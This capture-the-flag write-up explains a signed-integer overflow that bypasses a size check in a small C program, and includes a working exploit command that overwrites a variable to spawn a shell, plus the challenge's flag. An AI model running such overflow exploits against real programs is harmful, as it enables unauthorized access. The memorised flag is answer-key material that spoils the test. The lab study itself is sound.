# bonus1 — signed integer overflow to bypass a size check

**Teaches:** signed vs unsigned, and 32-bit multiplication wraparound.

## 1–2. Reconstructed C
```c
int main(int ac, char **av) {
    int  nb;
    char str[40];                 // nb sits 40 bytes after str's start
    nb = atoi(av[1]);
    if (!(nb <= 9)) return 1;     // nb must be <= 9  (signed compare)
    memcpy(str, av[2], nb * 4);   // but the length is nb*4 (used as size_t)
    if (nb == 0x574f4c46)         // "FLOW" little-endian
        execl("/bin/sh", "sh", NULL);
    return 0;
}
```

## 3. The vulnerability
The check `nb <= 9` is **signed**, but `memcpy`'s length `nb * 4` is used as an
**unsigned** `size_t`. Choose a large negative `nb`: it passes `nb <= 9`, yet
`nb * 4` wraps around a 32-bit register into a **small positive** number, letting
`memcpy` copy enough bytes to overflow `str` and overwrite `nb` itself.

## 4. The math
We want `nb * 4 == 44` (enough to fill `str[40]` + overwrite the 4-byte `nb`).
In 32-bit arithmetic, `-2147483637 * 4` overflows and leaves `44`:
```
-2147483637 * 4  (mod 2^32) = 44
```
And `-2147483637 <= 9` is true. 

## 5. Exploit
```
./bonus1 -2147483637 $(python -c 'print "A"*40 + "\x46\x4c\x4f\x57"')
```
**Why it works:** `nb = -2147483637` passes the signed check; `nb*4` wraps to 44
so `memcpy` copies 44 bytes; the first 40 fill `str`, the last 4 overwrite `nb`
with `0x574f4c46`. The final `if (nb == 0x574f4c46)` is now true → `execl` shell.

Flag → `579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245`
